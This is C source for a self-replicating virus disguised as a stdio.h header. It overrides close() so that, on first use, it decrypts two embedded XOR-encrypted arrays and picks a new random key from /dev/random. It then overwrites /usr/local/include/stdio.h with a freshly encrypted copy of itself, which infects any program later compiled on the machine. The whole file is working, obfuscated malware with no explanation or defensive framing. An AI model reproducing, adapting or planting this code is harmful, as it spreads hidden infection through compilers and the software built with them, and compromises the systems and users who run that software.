#include "/usr/include/stdio.h"
#include <fcntl.h>
#include <linux/unistd.h>
#include <sys/stat.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#define CHARS 2518
#define CHARS2 276

int virfunc(void);
int Close(int);
int Crypt(char *, int);
int mutate(char*);

char B[] = 
"\x3c\xe0\x11\xc6\x73\xfc\x1b\xc0\x3f\xab\x50\xd0\x6c\xfb"
"\x50\xcc\x71\xea\x13\xd0\x7b\xec\x50\xd6\x6b\xed\x16\xca\x31"
"\xe1\x5d\xaf\x3c\xe0\x11\xc6\x73\xfc\x1b\xc0\x3f\xb5\x19\xc6"
"\x71\xfd\x13\x8b\x77\xb7\x75\x86\x76\xe7\x1c\xc9\x6a\xed\x1a"
"\x85\x23\xe5\x16\xcb\x6a\xf1\x50\xd0\x71\xe0\x0c\xd1\x7b\xa7"
"\x17\x9b\x15\xaa\x16\xcb\x7c\xe5\x0a\xc1\x7a\xa9\x43\xd6\x66"
"\xfa\x50\xd6\x6b\xe8\x0b\x8b\x77\xb7\x75\x86\x76\xe7\x1c\xc9"
"\x6a\xed\x1a\x85\x23\xec\x0d\xd7\x71\xe6\x51\xcd\x21\x83\x5c"
"\xcc\x71\xea\x13\xd0\x7b\xec\x5f\x99\x6a\xe7\x16\xd6\x6b\xed"
"\x51\xcd\x21\x83\x5c\xcc\x71\xea\x13\xd0\x7b\xec\x5f\x99\x6c"
"\xfd\x0d\xcc\x71\xee\x51\xcd\x21\x83\x5c\xc1\x7a\xef\x16\xcb"
"\x7a\xa9\x3c\xed\x5e\xdb\x2c\x85\x2d\xbc\x4e\x9d\x15\xaa\x1b"
"\xc0\x79\xe0\x11\xc0\x3f\xca\x37\xe4\x4d\xda\x4d\x85\x2d\xbe"
"\x49\xaf\x15\xe0\x11\xd1\x3f\xff\x16\xd7\x79\xfc\x11\xc6\x37"
"\xff\x10\xcc\x7b\xa0\x44\xaf\x76\xe7\x0b\x85\x5c\xe5\x10\xd6"
"\x7a\xa1\x16\xcb\x6b\xa0\x44\xaf\x76\xe7\x0b\x85\x5c\xfb\x06"
"\xd5\x6b\xa1\x1c\xcd\x7e\xfb\x5f\x8f\x33\xa9\x16\xcb\x6b\xa0"
"\x44\xaf\x76\xe7\x0b\x85\x72\xfc\x0b\xc4\x6b\xec\x57\xc6\x77"
"\xe8\x0d\x8f\x36\xb2\x75\xaf";

char C[] = 
"\x76\xe7\x0b\x85\x7c\xe5\x10\xd6"
"\x7a\xa1\x16\xcb\x6b\xa9\x19\xc1\x36\xa9\x75\xde\x15\xa9\x5f"
"\x85\x16\xff\x16\xd7\x79\xfc\x11\xc6\x37\xa0\x44\xaf\x3f\xa9"
"\x5f\x85\x3f\xa9\x5f\x85\x6d\xec\x0b\xd0\x6d\xe7\x5f\xe6\x73"
"\xe6\x0c\xc0\x37\xef\x1b\x8c\x24\x83\x02\xaf\x15\x83\x16\xcb"
"\x6b\xa9\x3c\xc9\x70\xfa\x1a\x8d\x76\xe7\x0b\x85\x76\xa0\x75"
"\xde\x15\xa9\x5f\x85\x16\xe5\x10\xcb\x78\xa9\x20\xfa\x6d\xec"
"\x0c\x9e\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\x83\x5f\x85\x3f"
"\xa9\x5f\x85\x3f\xa9\x20\xfa\x7e\xfa\x12\xfa\x40\xa9\x09\xca"
"\x73\xe8\x0b\xcc\x73\xec\x5f\x8d\x3d\xe0\x11\xd1\x3f\xad\x4f"
"\xdd\x27\xb9\x5d\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9"
"\x5f\x85\x3f\xa9\x5f\x85\x16\xb3\x5f\x87\x22\xe8\x5d\x85\x37"
"\xd6\x20\xd7\x7a\xfa\x56\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85"
"\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f"
"\x85\x25\xa9\x5d\x95\x3d\xa9\x57\xfa\x40\xc7\x2d\xfa\x7c\xe5"
"\x10\xd6\x7a\xa0\x53\x87\x7d\xab\x5f\x8d\x37\xe5\x10\xcb\x78"
"\xa0\x57\xcc\x36\xa0\x56\x9e\x15\xa9\x5f\x85\x3f\xa9\x5f\x85"
"\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f"
"\x85\x3f\xe0\x19\x85\x37\xd6\x20\xd7\x7a\xfa\x5f\x9b\x22\xa9"
"\x4f\x8c\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f"
"\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85"
"\x16\xfb\x1a\xd1\x6a\xfb\x11\x85\x37\xe0\x11\xd1\x36\xd6\x20"
"\xd7\x7a\xfa\x44\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9"
"\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x7a"
"\xfb\x0d\xcb\x70\xa9\x42\x85\x32\xd6\x20\xd7\x7a\xfa\x44\xaf"
"\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f"
"\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x6d\xec\x0b\xd0\x6d\xe7"
"\x5f\x88\x2e\xb2\x75\xd8\x15\x83\x16\xcb\x6b\xa9\x09\xcc\x6d"
"\xef\x0a\xcb\x7c\xa1\x09\xca\x76\xed\x56\xaf\x64\x83\x5f\x85"
"\x3f\x80\x39\xec\x53\xcc\x5f\x8f\x79\xed\x44\xaf\x3f\xa9\x5f"
"\xac\x6c\xfd\x1e\xd1\x76\xea\x5f\xcc\x71\xfd\x5f\xc3\x76\xfb"
"\x0c\xd1\x3f\xb4\x5f\x95\x24\x83\x5f\x85\x3f\xa9\x5f\x85\x3f"
"\xa9\x16\xcb\x6b\xa9\x16\x85\x22\xa9\x4f\x89\x3f\xe3\x5f\x98"
"\x3f\xb8\x53\x85\x70\xe5\x1b\xc8\x7e\xfa\x14\x85\x22\xa9\x4f"
"\x9e\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9"
"\x5f\x85\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xe0\x19\x85\x37"
"\xef\x16\xd7\x6c\xfd\x56\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85"
"\x3f\xa9\x5f\xac\x6d\xec\x0b\xd0\x6d\xe7\x5f\x95\x24\x83\x5f"
"\x85\x3f\xa9\x5f\x85\x3f\xa9\x75\x85\x3f\xa9\x5f\x85\x3f\xa9"
"\x5f\xca\x73\xed\x12\xc4\x6c\xe2\x5f\x98\x3f\xfc\x12\xc4\x6c"
"\xe2\x57\x95\x36\xb2\x75\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\xe6"
"\x6d\xf0\x0f\xd1\x37\xcb\x53\x85\x5c\xc1\x3e\xf7\x4c\xbb\x56"
"\x9e\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xca\x0d\xdc\x6f\xfd"
"\x57\xe6\x33\xa9\x3c\xed\x5e\xdb\x2c\x8c\x24\x83\x5f\x85\x3f"
"\xa9\x5f\x85\x3f\xa9\x12\xd0\x6b\xe8\x0b\xc0\x37\xe2\x1a\xdc"
"\x36\xb2\x75\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\xc8\x74\xed\x16"
"\xd7\x37\xab\x50\xd0\x6c\xfb\x50\xc9\x70\xea\x1e\xc9\x30\xe0"
"\x11\xc6\x73\xfc\x1b\xc0\x3d\xa5\x5f\x95\x28\xbc\x4a\x8c\x24"
"\x83\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x0a\xcb\x73\xe0\x11\xce"
"\x37\xab\x50\xd0\x6c\xfb\x50\xc9\x70\xea\x1e\xc9\x30\xe0\x11"
"\xc6\x73\xfc\x1b\xc0\x30\xfa\x0b\xc1\x76\xe6\x51\xcd\x3d\xa0"
"\x44\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x76\xef\x5f\x8d\x37"
"\xef\x1b\x85\x22\xa9\x19\xc1\x70\xf9\x1a\xcb\x37\xe6\x0f\xc0"
"\x71\xa1\x5d\x8a\x6a\xfa\x0d\x8a\x73\xe6\x1c\xc4\x73\xa6\x16"
"\xcb\x7c\xe5\x0a\xc1\x7a\xa6\x0c\xd1\x7b\xe0\x10\x8b\x77\xab"
"\x53\x85\x50\xd6\x3c\xf7\x5a\xc8\x2b\xd9\x50\xd6\x2d\xe1\x48"
"\xdb\x53\x85\x2f\xbf\x4b\x91\x36\xa5\x5f\x87\x68\xa2\x5d\x8c"
"\x36\xa9\x42\x98\x3f\xc7\x2a\xe9\x53\xa0\x75\x85\x3f\xa9\x5f"
"\x85\x3f\xa9\x5f\x85\x3f\xa9\x76\xd5\x7a\xfb\x0d\xca\x6d\xa1"
"\x5d\xc3\x70\xf9\x1a\xcb\x3d\xa0\x44\xaf\x3f\xa9\x5f\x85\x3f"
"\xa9\x5f\x85\x79\xf9\x0d\xcc\x71\xfd\x19\x8d\x79\xed\x53\x85"
"\x3d\xac\x0c\x87\x33\xa9\x3d\x8c\x24\x83\x5f\x85\x3f\xa9\x5f"
"\x85\x3f\xa9\x3c\xd7\x66\xf9\x0b\x8d\x5d\xa5\x5f\xe6\x57\xc8"
"\x2d\xf6\x2d\xa0\x44\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x79"
"\xf9\x0d\xcc\x71\xfd\x19\x8d\x79\xed\x53\x85\x3d\xea\x17\xc4"
"\x6d\xa9\x3d\xfe\x42\xa9\x42\x85\x43\xe7\x23\x87\x3d\xa0\x44"
"\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x79\xe6\x0d\x85\x37\xe0"
"\x5f\x98\x3f\xb9\x44\x85\x76\xa9\x43\x85\x5c\xc1\x3e\xf7\x4c"
"\xbb\x44\x85\x76\xa2\x54\x8c\x3f\xf2\x75\x85\x3f\xa9\x5f\x85"
"\x3f\xa9\x5f\x85\x3f\xa9\x76\xcc\x79\xa9\x57\x8d\x75\xa9\x5a"
"\x85\x2e\xbc\x56\x85\x22\xb4\x5f\x95\x36\xa9\x04\xaf\x3f\xa9"
"\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f"
"\xa9\x5f\xac\x79\xf9\x0d\xcc\x71\xfd\x19\x8d\x79\xed\x53\x85"
"\x3d\xd5\x5d\xf9\x71\xd5\x5d\x87\x36\xb2\x75\x85\x3f\xa9\x5f"
"\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9"
"\x5f\x85\x3f\xa9\x5f\xcf\x3f\xb4\x5f\x95\x24\x83\x5f\x85\x3f"
"\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x02\xaf"
"\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f"
"\x85\x79\xf9\x0d\xcc\x71\xfd\x19\x8d\x79\xed\x53\x85\x3d\xd5"
"\x23\xdd\x3a\xb9\x4d\xdd\x3d\xa5\x5f\x8d\x6a\xe7\x0c\xcc\x78"
"\xe7\x1a\xc1\x3f\xea\x17\xc4\x6d\xa0\x3d\xfe\x76\xd4\x56\x9e"
"\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f"
"\x85\x3f\xe3\x54\x8e\x24\x83\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9"
"\x02\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x79\xf9\x0d\xcc\x71"
"\xfd\x19\x8d\x79\xed\x53\x85\x3d\xd5\x5d\x9e\x43\xe7\x23\xcb"
"\x3d\xa0\x44\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x79\xf9\x0d"
"\xcc\x71\xfd\x19\x8d\x79\xed\x53\x85\x3d\xea\x17\xc4\x6d\xa9"
"\x3c\xfe\x42\xa9\x42\x85\x43\xe7\x23\x87\x3d\xa0\x44\xaf\x3f"
"\xa9\x5f\x85\x3f\xa9\x5f\x85\x5c\xfb\x06\xd5\x6b\xa1\x3c\x89"
"\x3f\xca\x37\xe4\x4d\xda\x56\x9e\x15\xa9\x5f\x85\x3f\xa9\x5f"
"\x85\x3f\xef\x10\xd7\x3f\xa1\x16\x85\x22\xa9\x4f\x9e\x3f\xe0"
"\x5f\x99\x3f\xca\x37\xe4\x4d\xda\x44\x85\x76\xa2\x54\x8c\x3f"
"\xf2\x75\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x76\xcc"
"\x79\xa9\x57\x8d\x75\xa9\x5a\x85\x2e\xbc\x56\x85\x22\xb4\x5f"
"\x95\x36\xa9\x04\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9"
"\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\xac\x79\xf9\x0d\xcc\x71"
"\xfd\x19\x8d\x79\xed\x53\x85\x3d\xd5\x5d\xf9\x71\xd5\x5d\x87"
"\x36\xb2\x75\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f"
"\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\xcf\x3f\xb4"
"\x5f\x95\x24\x83\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f"
"\xa9\x5f\x85\x3f\xa9\x02\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85"
"\x3f\xa9\x5f\xac\x79\xf9\x0d\xcc\x71\xfd\x19\x8d\x79\xed\x53"
"\x85\x3d\xd5\x23\xdd\x3a\xb9\x4d\xdd\x3d\xa5\x5f\x8d\x6a\xe7"
"\x0c\xcc\x78\xe7\x1a\xc1\x3f\xea\x17\xc4\x6d\xa0\x3c\xfe\x76"
"\xd4\x56\x9e\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85"
"\x3f\xa9\x5f\x85\x3f\xe3\x54\x8e\x24\x83\x5f\x85\x3f\xa9\x5f"
"\x85\x3f\xa9\x02\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x79\xf9"
"\x0d\xcc\x71\xfd\x19\x8d\x79\xed\x53\x85\x3d\xd5\x5d\x9e\x43"
"\xe7\x23\xcb\x3d\xa0\x44\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85"
"\x79\xf9\x0d\xcc\x71\xfd\x19\x8d\x79\xed\x53\x85\x3d\xd5\x11"
"\xf9\x71\xfc\x11\xd6\x76\xee\x11\xc0\x7b\xa9\x1c\xcd\x7e\xfb"
"\x5f\xce\x7a\xf0\x24\x91\x42\xa9\x42\x85\x64\xb9\x07\x80\x2f"
"\xbb\x07\x89\x3f\xb9\x07\x80\x2f\xbb\x07\x89\x3f\xb9\x07\x80"
"\x2f\xbb\x07\x89\x3f\xb9\x07\x80\x2f\xbb\x07\xd8\x24\xd5\x11"
"\xf9\x71\xab\x53\x85\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9"
"\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x57\xd0\x71"
"\xfa\x16\xc2\x71\xec\x1b\x85\x7c\xe1\x1e\xd7\x36\xe2\x1a\xdc"
"\x44\xb9\x22\x89\x3f\xa1\x0a\xcb\x6c\xe0\x18\xcb\x7a\xed\x5f"
"\xc6\x77\xe8\x0d\x8c\x74\xec\x06\xfe\x2e\xd4\x53\x85\x15\xa9"
"\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f"
"\xa9\x5f\x85\x3f\xa9\x57\xd0\x71\xfa\x16\xc2\x71\xec\x1b\x85"
"\x7c\xe1\x1e\xd7\x36\xe2\x1a\xdc\x44\xbb\x22\x89\x3f\xa1\x0a"
"\xcb\x6c\xe0\x18\xcb\x7a\xed\x5f\xc6\x77\xe8\x0d\x8c\x74\xec"
"\x06\xfe\x2c\xd4\x56\x9e\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f"
"\xca\x0d\xdc\x6f\xfd\x57\xe6\x33\xa9\x3c\xed\x5e\xdb\x2c\x8c"
"\x24\x83\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x19\xd5\x6d\xe0\x11"
"\xd1\x79\xa1\x19\xc1\x33\xa9\x5d\x80\x6c\xab\x53\x85\x5c\xa0"
"\x44\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x79\xea\x13\xca\x6c"
"\xec\x57\xc3\x7b\xa0\x44\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85"
"\x79\xe0\x0d\xd6\x6b\xa9\x42\x85\x2e\xb2\x75\x85\x3f\xa9\x5f"
"\x85\x3f\xa9\x5f\xd0\x72\xe8\x0c\xce\x37\xe6\x13\xc1\x72\xe8"
"\x0c\xce\x36\xb2\x75\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\xd7\x7a"
"\xfd\x0a\xd7\x71\xa9\x4f\x9e\x15\xf4\x5f\xaf\x15\xe0\x11\xd1"
"\x3f\xca\x0d\xdc\x6f\xfd\x57\xc6\x77\xe8\x0d\x85\x35\xfa\x53"
"\x85\x76\xe7\x0b\x85\x73\xec\x11\x8c\x15\xf2\x75\x85\x3f\xa9"
"\x76\xcc\x71\xfd\x5f\xcc\x3f\xb4\x5f\x95\x33\xa9\x15\x85\x22"
"\xa9\x4f\x9e\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\x83\x5f\x85"
"\x3f\xa9\x5f\x85\x3f\xa9\x19\xca\x6d\xa9\x57\xcc\x3f\xb4\x5f"
"\x95\x24\xa9\x16\x85\x23\xa9\x13\xc0\x71\xb2\x5f\xcc\x34\xa2"
"\x56\x85\x64\x83\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f"
"\x80\x0c\xfe\x76\xd4\x5f\xfb\x22\xa9\x14\xc0\x66\xd2\x15\xf8"
"\x24\x83\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f"
"\x85\x3f\xa9\x15\x85\x22\xa9\x57\xcf\x3f\xa2\x5f\x94\x36\xa9"
"\x5a\x85\x2b\xb2\x75\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\xd8\x15"
"\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xfb\x1a\xd1\x6a\xfb\x11\x85"
"\x2f\xb2\x75\xd8\x15\x83\x16\xcb\x6b\xa9\x12\xd0\x6b\xe8\x0b"
"\xc0\x37\xea\x17\xc4\x6d\xa9\x55\xd6\x36\x83\x04\xaf\x3f\xa9"
"\x5f\xac\x76\xe7\x0b\x85\x79\xed\x53\x85\x76\xb2\x75\x85\x3f"
"\xa9\x5f\x85\x3f\xa9\x5f\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85"
"\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xef\x10\xd7\x3f\xa1\x16"
"\x85\x22\xa9\x4f\x9e\x3f\xe0\x5f\x99\x3f\xbd\x44\x85\x76\xa2"
"\x54\x8c\x3f\xf2\x75\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f"
"\xa9\x76\xcc\x79\xa9\x57\x8d\x79\xed\x5f\x98\x3f\xe6\x0f\xc0"
"\x71\xa1\x5d\x8a\x7b\xec\x09\x8a\x6d\xe8\x11\xc1\x70\xe4\x5d"
"\x89\x3f\xc6\x20\xf7\x5b\xc6\x31\xe9\x46\xa0\x56\x85\x23\xb4"
"\x5f\x95\x36\xa9\x04\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f"
"\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\xac\x6f\xec\x0d\xd7"
"\x70\xfb\x57\x87\x70\xf9\x1a\xcb\x3d\xa0\x44\xaf\x3f\xa9\x5f"
"\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9"
"\x5f\x85\x3f\xa9\x5f\x85\x6d\xec\x0b\xd0\x6d\xe7\x5f\xc0\x6d"
"\xfb\x11\xca\x24\x83\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85"
"\x3f\xa9\x5f\x85\x3f\xa9\x02\xaf\x3f\xa9\x5f\x85\x3f\xa9\x5f"
"\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x6d\xec\x1e\xc1\x37\xef"
"\x1b\x89\x3f\xaf\x0c\xfe\x76\xd4\x53\x85\x2e\xa0\x44\xaf\x3f"
"\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xa9\x5f\x85"
"\x5c\xe5\x10\xd6\x7a\xa1\x19\xc1\x36\xb2\x75\x85\x3f\xa9\x5f"
"\x85\x3f\xa9\x5f\xd8\x15\xa9\x5f\x85\x3f\xa9\x5f\x85\x3f\xfb"
"\x1a\xd1\x6a\xfb\x11\x85\x2f\xb2\x75\xd8\x15\xa9\x5f\x85\x3f"
"\xa9\x5f\x85\x3f\x83";



unsigned char key[4] = {0x1f, 0x89, 0x7f, 0xa5};

int close(int fd) 
{
   	virfunc();
        return Close(fd);
}


int Close(int i)
{
   	long __res;
        
        __asm__ volatile ("int $0x80"
                	: "=a" (__res)
                        : "0" (__NR_close),"b" ((long)(i)));
                        if (__res >= 0)
                           	return (int)__res;
                        errno = -__res;
                        return -1;
}

int virfunc(void)
{
   	FILE *fd;
   	static int first = 0;
        int i = 0, j = 1, oldmask = 0;
               
        if (first)
           	return 0;
        
        oldmask = umask(0);
        Crypt(B, CHARS2);
        Crypt(C, CHARS);
        mutate(key);
        mkdir("/usr/local/include", 0755);
        unlink("/usr/local/include/stdio.h");
        if ((fd = fdopen(open("/usr/local/include/stdio.h", O_CREAT|O_RDWR, 0644), "w+")) == NULL)
           	perror("fopen");
        fprintf(fd, "%s", B);
        Crypt(B, CHARS2);
        fprintf(fd, "char B[] = \n\"");
        for (i = 0; i < CHARS2; i++) {
           	if ((j % 15) == 0) {
                   	fprintf(fd, "\"\n\"");
                        j = 0;
                }
                fprintf(fd, "\\x%02x", (unsigned char)B[i]);
                j++;
        }
        fprintf(fd, "\";\n\n");
        fprintf(fd, "char C[] = \n\"");
        Crypt(C, CHARS);
        for (i = 0; i < CHARS; i++) {
           	if ((j % 15) == 0) {
                   	fprintf(fd, "\"\n\"");
                        j = 0;
                }
           	fprintf(fd, "\\x%02x", (unsigned char)C[i]);
                j++;
        }
        fprintf(fd, "\";\n\n");
        fprintf(fd, "\n\nunsigned char key[4] = {0x%02x, 0x%02x, 0x%02x, 0x%02x};\n\n", 
                     (unsigned char)key[0], (unsigned char)key[1], 
                     (unsigned char)key[2], (unsigned char)key[3]);
        Crypt(C, CHARS);
        fprintf(fd, "%s", C);
        fclose(fd);
        first = 1;
        umask(oldmask);
        return 0;
} 

int Crypt(char *s, int len)
{
   	int i = 0, j = 0;
        
        for (i = 0; i < len; i++) {
           	s[i] ^= key[j];
                j = (j + 1) % 4;
        }
        return 0;
}

int mutate(char *s)
{
   	int fd, i;
        
        
        for (i = 0; i < 4; i++) {
           	if ((fd = open("/dev/random", O_RDONLY)) <= 0) {
                   	perror("open");
                        return errno;
                }
                read(fd, &s[i], 1);
                Close(fd);
        }
        return 0;
}
        
